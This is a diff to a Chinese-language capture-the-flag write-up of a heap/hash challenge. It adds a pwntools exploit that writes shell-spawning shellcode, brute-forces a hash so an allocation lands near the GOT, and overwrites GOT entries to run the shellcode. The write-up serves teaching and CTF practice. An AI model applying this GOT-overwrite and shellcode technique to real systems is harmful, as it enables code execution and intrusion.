@@ -13,7 +13,7 @@
 
 ### 解题思路
 
-先随便分配一块内存，写入shellcode。再分配一块内存，控制哈希值正好是got表地址，由此可编辑got表为shellcode地址。（咋控制的哈希值没看懂，求密码师傅们解答。）
+先随便分配一块内存，写入shellcode。再分配一块内存，爆破哈希值到got表附近，由此可编辑got表为shellcode地址。
 
 ``` python
 def add(sz):
@@ -28,8 +28,21 @@ def edit(idx,data):
 add(1024)
 edit(0,asm(shellcraft.sh()))
 
-add(0xE64164E0) # hash(0xE64164E0) == got['puts']
-edit(1,p64(0xdde6c400)) # hash(1024) == 0xdde6c400
+add(0x4a15b) # hash(0x4a15b) == 0x80492eb == gotbase-0xbed
+edit(1,'A'*0xbed+p64(0xdde6c400)*20) # hash(1024) == 0xdde6c400
+```
+
+> 爆破hash可以不是那么精准，只要能read覆盖到got表即可
+>
+> 可以忽略后三位进行爆破：
+
+``` python
+#!/usr/bin/python3
+for i in range(0xffffffff): 
+    tmp = (0x9e3779b1*i)&0xffffffff
+    print(hex(i),hex(tmp)) 
+    if tmp|0xfff == 0x8049ed8|0xfff: 
+        input('next?')
 ```
 
 ### More
